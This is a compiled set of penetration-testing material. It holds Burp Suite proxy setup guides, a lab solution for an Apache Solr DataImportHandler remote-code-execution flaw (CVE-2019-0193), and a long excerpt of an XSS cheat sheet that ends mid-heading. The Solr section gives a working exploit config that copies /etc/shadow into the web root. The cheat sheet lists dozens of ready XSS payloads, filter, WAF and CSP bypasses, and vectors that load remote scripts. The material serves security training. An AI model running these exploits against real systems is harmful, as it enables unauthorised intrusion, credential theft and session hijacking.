 
 
 
 
 
 
 
 
 
 
 
 
 
 
A.2 Mozilla Firefox with burp suite (Windows OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
Step 2: ​Scroll down to the bottom of the page and click on “Settings” button under “Network 
Settings” section. 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
Click on the OK button.  
 
Step 4: ​Start Burp suite. 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix B 
 
B.1 Google Chrome with Burp Suite (Kali OS) 
 
Step 1: ​Open Google Chrome and navigate to the URL given below. 
 
URL: ​chrome://settings 
 
 
 
Google Chrome Settings page will appear. 
 
Step 2:​ Search for “proxy” in the search box. 
 
 
 
 
 
 
Step 3: ​Upon clicking on “Open proxy settings”, The “Networks” settings window will appear. 
Click on Network Proxy option. 
 
 
 
 
Step 4: ​Enter “127.0.0.1” in “HTTP Proxy” textbox and enter 8080 as port.  
 
 
 
Close the dialog box.  
 
Step 5: ​Start Burp suite. 
 
 
 
 
Step 6: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
B.2 Mozilla Firefox with burp suite (Kali OS) 
 
Step 1: ​Open Mozilla Firefox and navigate to the URL given below. 
 
URL: ​about:preferences 
 
 
 
 
Step 2: ​Click on “Advanced” tab on the left panel and then click on “Settings” button under 
“Network” tab. 
 
 
 
 
 
 
 
 
Step 3:  ​Enter “127.0.0.1” and “8080” in “HTTP Proxy” textbox and “Port” textbox respectively. 
 
 
 
 
Step 4: ​Start Burp suite. 
 
 
 
 
 
Step 5: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
 
 
All the HTTP request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
 
 
Appendix C 
 
C.1 FoxyProxy on Google Chrome with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Google Chrome can be installed from the URL given below: 
 
URL: 
https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfn
p?hl=en 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
Step 3: ​Click on the “Add New Proxy” Button.  
 
 
 
Step 4: ​Enter “127.0.0.1” in “Host or IP Address” textbox and enter “8080” in Port textbox. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Click on the Save button. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
The configured proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs” 
 
 
 
The FoxyProxy icon will change its color (In this case it is blue). 
 
 
 
 
 
 
 
 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080”. 
 
 
 
All the HTTP/HTTPS request made by Google Chrome will be intercepted by Burp Suite.  
 
 
 
 
 
 
C.2 FoxyProxy on Mozilla Firefox with Burp Suite 
 
Step 1: ​Installing FoxyProxy. 
 
FoxyProxy Standard plugin for Mozilla Firefox can be installed from the URL given below: 
 
URL: ​https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/ 
 
After installing FoxyProxy, a small fox icon will appear on the right side of the address bar.  
 
 
 
Step 2: ​Click on the FoxyProxy icon and click on Options. 
 
 
 
 
 
 
Step 3: ​Click on the add button on the left panel 
 
 
 
Step 4: ​Enter “127.0.0.1” in “IP Address, DNS name, server name” textbox and enter “8080” in 
Port textbox. 
 
 
 
Click on the Save button. 
 
 
 
The proxy will appear in the proxies table. 
 
Step 5: ​Enable the proxy. 
 
Click on the FoxyProxy icon and select the option “Use proxy 127.0.0.1:8080 for all URLs 
(ignore patterns)” 
 
 
 
The FoxyProxy icon will change its color (In this case it is green). 
 
Step 6: ​Start Burp suite. 
 
 
 
Step 7: ​Navigate to “Options” tab under “Proxy” tab and verify that the “running” checkbox is 
selected for the interface “127.0.0.1:8080” 
 
 
 
All the HTTP/HTTPS request made by Mozilla Firefox will be intercepted by Burp Suite.  
 
 
 
 
 
 
Name 
Apache Solr 8.1.1 
URL 
https://attackdefense.com/challengedetails?cid=1531  
Type 
Real World Webapps : XML External Entity 
 
 
Important Note: This document illustrates all the important steps required to complete this lab.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
This is by no means a comprehensive step-by-step solution for this exercise. This is only
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
provided as a reference to various commands needed to complete this exercise and for your
 
  
 
 
 
 
 
 
 
 
 
 
 
 
further research on this topic. Also, note that the IP addresses and domain names might be
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
different in your lab.  
 
Solution:  
 
Step 1: ​ Identifying the ip address of the target machine. 
 
Command:​ ip addr  
 
 
 
The web application is running on port 8983 on the target machine. The IP address of the target 
machine is 192.55.34.3 
 
Step 2: ​Inspect the web application. 
 
 
 
 
 
 
 
Step 3: ​Search on google “solr 8.8.1 exploit github”. 
 
 
 
 
The github link contains steps which can be followed to exploit the vulnerability. 
 
Github Link: 
https://github.com/veracode-research/solr-injection#3-cve-2019-0193-remote-code-execution-vi
a-dataimporthandler 
 
 
 
 
 
 
 
Step 4: ​After analysing the method, an xml file has to be hosted on localhost which will be 
fetched by the config used for remote code execution. 
 
<?xml version="1.0" encoding="utf-8"?> 
<note> 
<to>Tove</to> 
<from>Jani</from> 
<heading>Reminder</heading> 
<body>Don't forget me this weekend!</body> 
</note> 
 
 
 
Step 5: ​Start a local server at port 80 using PHP or python  
 
Command: ​php -S 0.0.0.0:80 
 
 
 
Step 6: ​Navigate to the DataImport page by choosing “db” core from “Core Selector” which is 
located on the left sidebar 
 
 
 
Step 7: ​Click on “DataImport” button located under “db” section 
 
 
 
 
 
 
 
 
 
 
 
 
 
Step 8:​ Click on “Debug mode” and copy the exploit under configuration textbox. 
 
Exploit code: 
 
<dataConfig> 
  <dataSource type="URLDataSource"/> 
  <script><![CDATA[ 
          function poc(){ java.lang.Runtime.getRuntime().exec("cp /etc/shadow 
/opt/solr/server/solr-webapp/webapp/poc.txt"); 
          } 
  ]]></script> 
  <document> 
    <entity name="stackoverflow" 
            url="http://192.55.34.2/solr" 
            processor="XPathEntityProcessor" 
            forEach="/note" 
            transformer="script:poc" /> 
  </document> 
</dataConfig> 
 
 
This poc function will try to copy the shadow file to web root directory 
 
 
Step 9: ​Click on “Execute with this configuration”  
 
 
 
 
The xml file has been indexed as well as the exploit worked too. 
 
Step 10:​ navigate to /solr/poc.txt 
 
 
 
 
 
 
 
The shadow file has been copied to webroot directory. 
 
 
References:  
 
1.
Apache Solr (​https://lucene.apache.org/solr/​)  
2.
CVE-2019-0193 (​https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-0193​)  
3.
Apache Solr DataImport Handler RCE (​https://github.com/jas502n/CVE-2019-0193​)  
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 1
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
"We only need to be lucky once.
They need to be lucky every time ."
Adapted from Irish Republican Army (IRA) statement - 1984.
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 2
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Disclaimer
We, author and publisher, are not responsible for the use of this material or the damage 
caused by application of the information provided in this book.  
Introduction
This cheat sheet is meant to be used by bug hunters, penetration testers, security analysts, 
web application security students and enthusiasts.
It’s about Cross-Site Scripting (XSS), the most widespread and common flaw found in the 
World Wide Web. You must be familiar with (at least) basic concepts of this flaw to enjoy 
this book. For that you can visit my blog at https://brutelogic.com.br/blog/xss101 to start.
There’s lot of work done in this field and it’s not the purpose of this book to cover them all. 
What you will see here is XSS content created or curated by me. I’ve tried to select what I 
think it’s the most useful info about that universe, most of the time using material from my 
own blog which is dedicated to that very security flaw.
IMPORTANT: if you got a pirate version of this material, please consider make a donation to
the author at https://paypal.me/brutelogic.
The structure of this book is very simple because it’s a cheat sheet. It has main subjects 
(Basics, Advanced, etc) and a taxonomy for every situation. Then come directions to use the
code right after, which comes one per line when in the form of a vector or payload. Some 
are full scripts, also with their use properly explained. 
Keep in mind that you might need to adapt some of the info presented here to your own 
scenario (like single to double quotes and vice-versa). Although I try to give you directions 
about it, any non-imagined specific behavior from you target application might influence 
the outcome.
A last tip: follow instructions strictly. If something is presented in an HTML fashion, it’s 
because it’s meant to be used that way. If not, it’s probably javascript code that can be used 
(respecting syntax) both in HTML and straight to existing js code. Unless told otherwise.
I sincerely hope it becomes an easy-to-follow consulting material for most of your XSS 
related needs. Enjoy!
Rodolfo Assis (Brute)
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 3
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
About This Release
This release include code that works on latest stable versions of major Gecko-based 
browsers (Mozilla Firefox branches) and Chromium-based browsers (Google Chrome, 
Opera, Apple Safari and Microsoft Edge).
Current desktop versions of those browsers are: Mozilla Firefox v73, Google Chrome v80, 
Opera v66 and Apple Safari v13. If you find something that doesn’t work as expected or any
correction you think it should be made, please let me know @brutelogic (Twitter) or drop an
email for brutelogic at null dot net.
Internet Explorer although still regarded as a major browser is barely covered in this release.
 
Some information was removed from previous edition as well as new and updated 
information was added to this edition.    
About The Author
Rodolfo Assis aka “Brute Logic” (or just “Brute”) is a self-taught computer hacker from Brazil 
working as a self-employed information security researcher and consultant. 
He is best known for providing some content in Twitter (@brutelogic) in the last years on 
several hacking topics, including hacking mindset, techniques, micro code (that fits in a 
tweet) and some funny hacking related stuff. Nowadays his main interest and research 
involves Cross Site Scripting (XSS), the most widespread security flaw of the web.
Brute helped to fix more than 1000 XSS vulnerabilities in web applications worldwide via 
Open Bug Bounty platform (former XSSposed). Some of them include big players in tech 
industry like Oracle, LinkedIn, Baidu, Amazon, Groupon e Microsoft.
Being hired to work with the respective team, he was one of the contributors improving 
Sucuri’s Website Application Firewall (CloudProxy) from 2015 to 2017, having gained a lot 
of field experience in web vulnerabilities and security evasion.
He is currently managing, maintaining and developing an online XSS Proof-of-Concept tool, 
named KNOXSS (https://knoxss.me). It already helped several bug hunters to find bugs and 
get rewarded as well as his blog (https://brutelogic.com.br).
Always supportive, Brute is proudly a living example of the following philosophy:
Don’t learn to hack, #hack2learn.
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 4
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Illustration
Layout & Design:
Rodolfo Assis 
@rodoassis (Twitter)
Cover photo by Andrew Neel on Unsplash.
                             
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 5
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Summary
1. Basics ……………………………………………………………………………………………………………..……….     7
2. Advanced ………………………………………………………………………………………………………………...     8
3. Bypass ……………………………………………………………………………………………………..…………..….   12
4. Exploiting ……………………………………………………………………………………..………………………….   21
5. Extra ……………………………………………………………………………..……………………….………………..   24
6. Brutal ………………………………………………………………………………………………………………………   28
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 6
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
HTML Injection
Use when input lands inside an attribute’s value of an HTML tag or outside tag except the 
ones described in next case. Prepend a “-->” to payload if input lands in HTML comments.
<svg onload=alert(1)>
"><svg onload=alert(1)>
HTML Injection – Tag Block Breakout
Use when input lands inside or between opening/closing of the following tags: 
<title><style><script><textarea><noscript><pre><xmp> and <iframe> (</tag> is 
accordingly). 
</tag><svg onload=alert(1)>
"></tag><svg onload=alert(1)>
HTML Injection - Inline 
Use when input lands inside an attribute’s value of an HTML tag but that tag can’t be 
terminated by greater than sign (>).
"onmouseover=alert(1) //
"autofocus onfocus=alert(1) //
HTML Injection - Source 
Use when input lands as a value of the following HTML tag attributes: href, src, data or 
action (also formaction). Src attribute in script tags can be an URL or “data:,alert(1)”. 
javascript:alert(1)
Javascript Injection
Use when input lands in a script block, inside a string delimited value.
'-alert(1)-'
'/alert(1)//
Javascript Injection - Escape Bypass
Use when input lands in a script block, inside a string delimited value but quotes are 
escaped by a backslash.
\'/alert(1)//
Javascript  Injection – Script Breakout 
Use when input lands anywhere within a script block. 
</script><svg onload=alert(1)>
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 7
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Javascript Injection - Logical Block
Use 1st or 2nd payloads when input lands in a script block, inside a string delimited value and 
inside a single logical block like function or conditional (if, else, etc). If quote is escaped with
a backslash, use 3rd payload.
'}alert(1);{'
'}alert(1)%0A{'
\'}alert(1);{//
Javascript Injection - Quoteless
Use when there’s multi reflection in the same line of JS code. 1st payload works in simple JS 
variables and 2nd one works in non-nested JS objects. 
/alert(1)//\
/alert(1)}//\
Javascript Context - Placeholder Injection in Template Literal
Use when input lands inside backticks (``) delimited strings or in template engines.
${alert(1)}
Multi Reflection HTML Injection - Double Reflection (Single Input)
Use to take advantage of multiple reflections on same page.
'onload=alert(1)><svg/1='
'>alert(1)</script><script/1=' 
*/alert(1)</script><script>/*
Multi Reflection i HTML Injection  - Triple Reflection (Single Input)
Use to take advantage of multiple reflections on same page.
*/alert(1)">'onload="/*<svg/1=' 
`-alert(1)">'onload="`<svg/1='
*/</script>'>alert(1)/*<script/1='
Multi Input Reflections HTML Injection -  Double & Triple
Use to take advantage of multiple input reflections on same page. Also useful in HPP (HTTP
Parameter Pollution) scenarios, where there are reflections for repeated parameters. 3rd 
payload makes use of comma-separated reflections of the same parameter.
p=<svg/1='&q='onload=alert(1)>
p=<svg 1='&q='onload='/*&r=*/alert(1)'>
q=<script/&q=/src=data:&q=alert(1)>
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 8
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
File Upload Injection – Filename
Use when uploaded filename is reflected somewhere in target page.
"><svg onload=alert(1)>.gif
File Upload Injection – Metadata
Use when metadata of uploaded file is reflected somewhere in target page. It uses 
command-line exiftool (“$” is the terminal prompt) and any metadata field can be set. 
$ exiftool -Artist='"><svg onload=alert(1)>' xss.jpeg
File Upload Injection – SVG File
Use to create a stored XSS on target when uploading image files. Save content below as 
“xss.svg”.
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
DOM Insert Injection
Use to test for XSS when injection gets inserted into DOM as valid markup instead of being
reflected in source code. It works for cases where script tag and other vectors won’t work.   
<img src=1 onerror=alert(1)>
<iframe src=javascript:alert(1)>
<details open ontoggle=alert(1)>
<svg><svg onload=alert(1)>
DOM Insert Injection – Resource Request
Use when native javascript code inserts into page the results of a request to an URL that 
can be controlled by attacker. 
data:text/html,<img src=1 onerror=alert(1)>
data:text/html,<iframe src=javascript:alert(1)>
PHP Self URL Injection
Use when current URL is used by target’s underlying PHP code as an attribute value of an 
HTML form, for example. Inject between php extension and start of query part (?) using a 
leading slash (/). 
https://brutelogic.com.br/xss.php/"><svg onload=alert(1)>?a=reader
Markdown Vector
Use in text boxes, comment sections, etc that allows some markup input. Click to fire. 
[clickme](javascript:alert`1`)
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 9
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Script Injection - No Closing Tag
Use when there’s a closing script tag (</script>) somewhere in the code after reflection. 
<script src=data:,alert(1)>
<script src=//brutelogic.com.br/1.js>
Javascript postMessage() DOM Injection (with Iframe) 
Use when there’s a “message” event listener like in “window.addEventListener(‘message’, ...)”
in javascript code without a check for origin. Target must be able to be framed (X-Frame 
Options header according to context). Save as HTML file (or using data:text/html) providing 
TARGET_URL and INJECTION (a XSS vector or payload).
<iframe src=TARGET_URL onload="frames[0].postMessage('INJECTION','*')">
XML-Based XSS
Use to inject XSS vector in a XML page (content types text/xml or application/xml). 
Prepend a “-->” to payload if input lands in a comment section or “]]>” if input lands in a 
CDATA section.
<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>
<x:script xmlns:x="http://www.w3.org/1999/xhtml" src="//brutelogic.com.br/1.js"/>
AngularJS Injections (v1.6 and up)
Use when there’s an AngularJS library loaded in page, inside an HTML block with ng-app 
directive (1st payload) or creating your own (2nd one).
{{$new.constructor('alert(1)')()}}
<x ng-app>{{$new.constructor('alert(1)')()}}
Onscroll Universal Vector
Use to XSS without user interaction when using onscroll event handler. It works with 
address, blockquote, body, center, dir, div, dl, dt, form, li, menu, ol, p, pre, ul, and h1 to h6 
HTML tags.
<p style=overflow:auto;font-size:999px onscroll=alert(1)>AAA<x/id=y></p>#y
Type Juggling
Use to pass an “if” condition matching a number in loose comparisons. 
1<svg onload=alert(1)>
1"><svg onload=alert(1)>
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 10
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
XSS in SSI
Use when there’s a Server-Side Include (SSI) injection.
<<!--%23set var="x" value="svg onload=alert(1)"--><!--%23echo var="x"-->>
SQLi Error-Based XSS
Use in endpoints where a SQL error message can be triggered (with a quote or backslash).
'1<svg onload=alert(1)>
<svg onload=alert(1)>\
Injection in JSP Path
Use in JSP-based applications in the path of URL.
//DOMAIN/PATH/;<svg onload=alert(1)>
//DOMAIN/PATH/;"><svg onload=alert(1)>
JS Injection - ReferenceError Fix
Use to fix the syntax of some hanging javascript code. Check console tab in Browser 
Developer Tools (F12) for the respective ReferenceError and replace var and function 
names accordingly.
 
';alert(1);var myObj='
';alert(1);function myFunc(){}'
Bootstrap Vector (up to v3.4.0)
Use when there’s a bootstrap library present on page. It also bypass Webkit Auditor, just 
click anywhere in page to trigger. Any char of href value can be HTML encoded do bypass 
filters. 
<html data-toggle=tab href="<img src=x onerror=alert(1)>">
Browser Notification
Use as an alternative to alert, prompt and confirm popups. It requires user acceptance (1st 
payload) but once user has authorized previously for that site, the 2nd one can be used. 
Notification.requestPermission(x=>{new(Notification)(1)})
new(Notification)(1)
XSS in HTTP Header - Cached
Use to store a XSS vector in application by using the MISS-MISS-HIT cache scheme (if 
there’s one in place). Replace <XSS> with your respective vector and TARGET with a dummy
string to avoid the actual cached version of the page. Fire the same request 3 times.
$ curl -H "Vulnerable_Header: <XSS>" TARGET/?dummy_string
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 11
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Mixed Case
Use to bypass case-sensitive filters.
<Svg OnLoad=alert(1)>
<Script>alert(1)</Script> 
Unclosed Tags
Use in HTML injections to avoid filtering based in the presence of both lower than (<) and 
greater than (>) signs. It requires a native greater than sign in source code after input 
reflection. 
<svg onload=alert(1)//
<svg onload="alert(1)"
Uppercase XSS
Use when application reflects input in uppercase. Replace “&” with “%26” and “#” with 
“%23” in URLs. 
<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>
<SCRIPT SRC=//BRUTELOGIC.COM.BR/1></SCRIPT>
Extra Content for Script Tags
Use when filter looks for “<script>” or “<script src=...” with some variations but without 
checking for other non-required attribute.
<script/x>alert(1)</script>
Double Encoded XSS
Use when application performs double decoding of input. 
%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E
%2522%253E%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E
Alert without Parentheses (Strings Only)
Use in an HTML vector or javascript injection when parentheses are not allowed and a 
simple alert box is enough.
alert`1`
Alert without Parentheses
Use in an HTML vector or javascript injection when parentheses are not allowed and PoC 
requires to return any target info.
setTimeout`alert\x28document.domain\x29`
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 12
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
setInterval`alert\x28document.domain\x29`
Alert without Parentheses – HTML Entities
Use only in HTML injections when parentheses are not allowed. Replace “&” with “%26” 
and “#” with “%23” in URLs. 
<svg onload=alert&lpar;1&rpar;>
<svg onload=alert&#40;1&#41>
Alert without Alphabetic Chars
Use when alphabetic characters are not allowed. Following is alert(1).
[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']
('\141\154\145\162\164\50\61\51')()
Alert Obfuscation
Use to trick several regular expression (regex) filters. It might be combined with previous 
alternatives (above). The shortest option “top” can also be replaced by “window”, “parent”, 
“self” or “this” depending on context.
(alert)(1)
a=alert,a(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
top['al\145rt'](1)
top[8680439..toString(30)](1)
Alert Alternative – Write & Writeln
Use as an alternative to alert, prompt and confirm. If used within a HTML vector it can be 
used as it is but if it’s a JS injection the full “document.write” form is required. Replace “&” 
with “%26” and “#” with “%23” in URLs. Write can be replaced by writeln.
write`XSSed!`
write`<img/src/o&#78error=alert&lpar;1)&gt;`
write('\74img/src/o\156error\75alert\501\51\76')
Alert Alternative – Open Pseudo-Protocol
Use as an alternative to alert, prompt and confirm. Above tricks applies here too. Only the 
second one works in Chromium-based browsers and requires <iframe name=0>.
top.open`javas\cript:al\ert\x281\x29`
top.open`javas\cript:al\ert\x281\x29${0}0`
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 13
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Alert Alternative - Eval + URL
Use as an alternative to call alert, prompt and confirm. First payload is the primitive form 
while the second replaces eval with the value of id attribute of vector used. URL must be in 
one of the following ways, in URL path after PHP extension or in fragment of the URL. Plus 
sign (+) must be encoded in URLs.
<svg onload=eval(" ' "+URL)> 
<svg id=eval onload=top[id](" ' "+URL)>
PoC URL must contain one of the following:
=> FILE.php/'/alert(1)//?...
=> #'/alert(1)
Alert Alternative - Eval + URL with Template Literal
${alert(1)}<svg onload=eval('`//'+URL)>
HTML Injection - Inline Alternative
Use to bypass blacklists. 
"onpointerover=alert(1) //
"autofocus onfocusin=alert(1) //
Strip-Tags Based Bypass
Use when filter strips out anything between a < and > characters like PHP’s strip_tags() 
function. Inline injection only.
"o<x>nmouseover=alert<x>(1)//
 "autof<x>ocus o<x>nfocus=alert<x>(1)//
File Upload Injection – HTML/js GIF Disguise
Use to bypass CSP via file upload. Save all content below as “xss.gif” or “xss.js” (for strict 
MIME checking). It can be imported to target page with <link rel=import href=xss.gif> (also 
“xss.js”) or <script src=xss.js></script>. It’s image/gif for PHP. 
GIF89a=//<script>
alert(1)//</script>;
Jump to URL Fragment
Use when you need to hide some characters from your payload that would trigger a WAF 
for example. It makes use of respective payload format after URL fragment (#). 
eval(URL.slice(-8)) #alert(1)
eval(location.hash.slice(1)) #alert(1)
document.write(decodeURI(location.hash)) #<img/src/onerror=alert(1)>
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 14
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Second Order XSS Injection
Use when your input will be used twice, like stored normalized in a database and then 
retrieved for later use or inserted into DOM. 
&lt;svg/onload&equals;alert(1)&gt;
PHP Spell Checker Bypass 
Use to bypass PHP’s pspell_new function which provides a dictionary to try to guess the 
input used to search. A “Did You Mean” Google-like feature for search fields.  
<scrpt> confirm(1) </scrpt>
Event Origin Bypass for postMessage() XSS
Use when a check for origin can be bypassed in javascript code of target by prepending one
of the allowed origins as a subdomain of the attacking domain that will send the payload. 
Example makes use of CrossPwn script (available in Extra section) at localhost.
http://facebook.com.localhost/crosspwn.html?target=//brutelogic.com.br/tests/
status.html&msg=<script>alert(1)</script>
CSP Bypass (for Whitelisted Google Domains) 
Use when there’s a CSP (Content-Security Policy) that allows execution from these 
domains.
<script src=//www.google.com/complete/search?client=chrome%26jsonp=alert(1)>
</script>
<script src=//www.googleapis.com/customsearch/v1?callback=alert(1)></script>
<script src=//ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js>
</script><x ng-app ng-csp>{{$new.constructor('alert(1)')()}}
SVG Vectors with Event Handlers
It works on Firefox but adding attributename=x inside <set> makes it work in Chromium-
based too. “Set” can also be replaced by “animate”. Use against blacklists.
<svg><set onbegin=alert(1)>
<svg><set end=1 onend=alert(1)>
SVG Vectors without Event Handlers
Use to avoid filters looking for event handlers or src, data, etc. Last one is Firefox only, 
already URL encoded.
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 15
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
<svg><a><rect width=99% height=99% /><animate attributeName=href 
to=javascript:alert(1)>
<svg><a><rect width=99% height=99% /><animate attributeName=href 
values=javascript:alert(1)>
<svg><a><rect width=99% height=99% /><animate attributeName=href to=0 
from=javascript:alert(1)>
<svg><use xlink:href=data:image/svg
%2Bxml;base64,PHN2ZyBpZD0ieCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAv
c3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI
%2BPGVtYmVkIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiBzcmM9Imp
hdmFzY3JpcHQ6YWxlcnQoMSkiLz48L3N2Zz4=%23x>
Vectors without Event Handlers
Use as an alternative to event handlers, if they are not allowed. Some require user 
interaction as stated in the vector itself (also part of them).
<script>alert(1)</script> 
<script src=data:,alert(1)> 
<iframe src=javascript:alert(1)> 
<embed src=javascript:alert(1)> 
<a href=javascript:alert(1)>click 
<math><brute href=javascript:alert(1)>click 
<form action=javascript:alert(1)><input type=submit> 
<isindex action=javascript:alert(1) type=submit value=click> 
<form><button formaction=javascript:alert(1)>click 
<form><input formaction=javascript:alert(1) type=submit value=click> 
<form><input formaction=javascript:alert(1) type=image value=click> 
<form><input formaction=javascript:alert(1) type=image src=SOURCE> 
<isindex formaction=javascript:alert(1) type=submit value=click> 
<object data=javascript:alert(1)> 
<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;> 
<svg><script xlink:href=data:,alert(1) /> 
<math><brute xlink:href=javascript:alert(1)>click 
Vectors with Agnostic Event Handlers
Use the following vectors when all known HTML tag names are not allowed. Any alphabetic
char or string can be used as tag name in place of “x”. They require user interaction as stated
by their very text content (which make part of the vectors too).
<x contenteditable onblur=alert(1)>lose focus! 
<x onclick=alert(1)>click this! 
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 16
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
<x oncopy=alert(1)>copy this! 
<x oncontextmenu=alert(1)>right click this! 
<x onauxclick=alert(1)>right click this!
<x oncut=alert(1)>copy this! 
<x ondblclick=alert(1)>double click this! 
<x ondrag=alert(1)>drag this! 
<x contenteditable onfocus=alert(1)>focus this! 
<x contenteditable oninput=alert(1)>input here! 
<x contenteditable onkeydown=alert(1)>press any key! 
<x contenteditable onkeypress=alert(1)>press any key! 
<x contenteditable onkeyup=alert(1)>press any key! 
<x onmousedown=alert(1)>click this! 
<x onmouseenter=alert(1)>hover this
<x onmousemove=alert(1)>hover this! 
<x onmouseout=alert(1)>hover this! 
<x onmouseover=alert(1)>hover this! 
<x onmouseup=alert(1)>click this! 
<x contenteditable onpaste=alert(1)>paste here!
<x onpointercancel=alert(1)>hover this!
<x onpointerdown=alert(1)>hover this!
<x onpointerenter=alert(1)>hover this!
<x onpointerleave=alert(1)>hover this!
<x onpointermove=alert(1)>hover this!
<x onpointerout=alert(1)>hover this!
<x onpointerover=alert(1)>hover this!
<x onpointerup=alert(1)>hover this!
<x onpointerrawupdate=alert(1)>hover this!
Mixed Context Reflection Entity Bypass
Use to turn a filtered reflection in script block in actual valid js code. It requires to be 
reflected both in HTML and javascript contexts, in that order, and close to each other. The 
svg tag will make the next script block be parsed in a way that even if single quotes become
encoded as &#39; or &apos; in reflection (sanitized), it will be valid for breaking out of 
current value and trigger the alert. Vectors for the following javascript scenarios, 
respectively: single quote sanitized, single quote fully escaped, double quote sanitized and 
double quote fully escaped.
">'-alert(1)-'<svg>
">&#39-alert(1)-&#39<svg>
">alert(1)-"<svg>
"&#34>alert(1)-&#34<svg>
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 17
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Strip-My-Script Vector
Use to trick filters that strips the classic and most known XSS vector. It works as it is and if 
“<script>” gets stripped.
<svg/on<script><script>load=alert(1)//</script>
Javascript Alternative Comments
Use when regular javascript comments (//) are not allowed, escaped or removed.
<!--
%0A-->
JS Lowercased Input
Use when target application turns your input into lowercase via javascript. It might work 
also for server-side lowercase operations.
<SCRİPT>alert(1)</SCRİPT>
<SCRİPT/SRC=data:,alert(1)>  
Overlong UTF-8
Use when target application performs best-fit mapping.
%CA%BA>%EF%BC%9Csvg/onload%EF%BC%9Dalert%EF%BC%881)>
Vectors Exclusive for ASP Pages
Use to bypass <[alpha] filtering in .asp pages.
%u003Csvg onload=alert(1)>
%u3008svg onload=alert(2)> 
%uFF1Csvg onload=alert(3)>
PHP Email Validation Bypass
Use to bypass FILTER_VALIDATE_EMAIL flag of PHP’s filter_var() function.
"><svg/onload=alert(1)>"@x.y
PHP URL Validation Bypass
